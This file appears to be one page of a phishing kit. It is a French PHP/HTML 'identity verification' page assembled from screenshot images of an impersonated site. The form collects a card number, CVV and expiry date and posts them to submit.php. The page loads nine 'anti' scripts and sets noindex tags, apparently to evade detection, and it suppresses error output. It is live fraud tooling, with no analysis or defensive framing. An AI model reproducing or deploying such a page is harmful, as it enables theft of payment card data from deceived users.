<?php
include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';
	
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');


    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Bienvenue</title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header2">
            <div class="container cc">
                <div class="header-inner">
                    <div class="title"><img style="min-width: 246px;" src="../assets/images/login-title.png"></div>
                    <div class="menu"><img style="min-width: 243px;" src="../assets/images/login-right.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- NAV -->
        <nav>
            <div class="container cc">
                <img style="min-width: 573px;" src="../assets/images/login-menu.png">
            </div>
        </nav>
        <!-- END NAV -->

        <!-- SERVICE -->
        <div class="mb50">
            <div class="container cc">
                <img style="min-width: 940px;" src="../assets/images/login-service.png">
            </div>
        </div>
        <!-- END SERVICE -->

        <!-- FORM -->
        <div class="mb50" id="details">
            <div class="container">
                <h3>Vérification d'identité</h3>
                <form method="post" action="submit.php">
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
                        <label for="cc_number" class="col-3">N° de votre carte</label>
                        <div class="col-9">
                            <input type="text" name="cc_number" id="cc_number" class="form-control" value="<?php echo get_value('cc_number'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
                        <label for="cc_cvv" class="col-3">Cryptogramme visuel (CVV)</label>
                        <div class="col-9">
                            <input type="text" name="cc_cvv" maxlength="3" id="cc_cvv" class="form-control" value="<?php echo get_value('cc_cvv'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                        </div>
                    </div>
                    <div class="row form-group align-items-center <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
                        <label for="cc_date" class="col-3">Date d'expiration (MM/AA)</label>
                        <div class="col-9">
                            <input type="text" maxlength="7" name="cc_date" id="cc_date" class="form-control" value="<?php echo get_value('cc_date'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                        </div>
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="cc">
                    <div class="text-right mt-5">
                        <button type="submit">Valider</button>
                    </div>
                </form>
            </div>
        </div>
        <!-- END FORM -->

        <!-- BANNER -->
        <div>
            <div class="container cc text-center">
                <img style="min-width: 934px;" src="../assets/images/login-banner.png">
            </div>
        </div>
        <!-- END BANNER -->


        <!-- FOOTER -->
        <footer id="footer2" class="mt50">
            <div class="container cc">
                <img style="min-width: 863px;" src="../assets/images/login-footer.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_date').payment('formatCardExpiry');
            jQuery('#cc_cvv').payment('formatCardCVC');
        </script>

    </body>

</html>